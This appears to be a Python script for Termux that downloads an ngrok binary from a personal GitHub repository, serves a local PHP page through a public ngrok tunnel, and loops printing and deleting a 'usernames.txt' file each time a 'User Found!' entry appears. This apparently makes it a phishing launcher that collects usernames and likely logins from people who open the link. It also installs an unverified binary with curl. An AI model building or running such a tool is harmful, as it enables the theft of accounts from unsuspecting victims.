import os,json
import time
from colorama import Fore
from re import search
from os.path import isfile
import requests,sys
try:
    import colorama,requests
except ImportError:
    os.system('pip3 install colorma')
    os.system('pip3 install requests')
def get_ngrok_url():
    global a
    url = "http://localhost:4040/api/tunnels"
    res = requests.get(url)
    res_unicode = res.content.decode("utf-8")
    res_json = json.loads(res_unicode)
    a =  res_json["tunnels"][0]["public_url"]


try:
    os.system("killall ngrok > /dev/null 2>&1 & ")
    os.system("killall php > /dev/null 2>&1 & ")

except:
    pass
exit_code = os.system('command -v ngrok > /dev/null 2>&1')
if exit_code == 0:
    pass
else:

    os.system ('clear')
    print ('\033[96m [✓] Downloading Ngrok File.......')
    os.system("curl https://raw.githubusercontent.com/ITSN0B1T4/ngrok/main/ngrok --output /data/data/com.termux/files/usr/bin/ngrok")
    os.system ("chmod +x /data/data/com.termux/files/usr/bin/ngrok")
    print("First Singup The https://ngrok.com/ and get the authtoken ")
    token = input("Please enter key only \nEnter authtoken: ")
    os.system(f"ngrok authtoken {token}")

os.system("ngrok http 5555 > /dev/null 2>&1 &")
time.sleep(3)
os.system("php -S localhost:5555 > /dev/null 2>&1 & ")
get_ngrok_url()
print(f'{Fore.GREEN}\n[+] Link: {a}')
print(f'{Fore.YELLOW}\n[+] Please Wait.....')

while True:
    if os.path.isfile('usernames.txt'):
        print(f'{Fore.GREEN}\n[*] User Found!')
        os.system(f"cat usernames.txt")
        os.system(f"rm -rf usernames.txt")
        print(f'{Fore.YELLOW} ='*40)
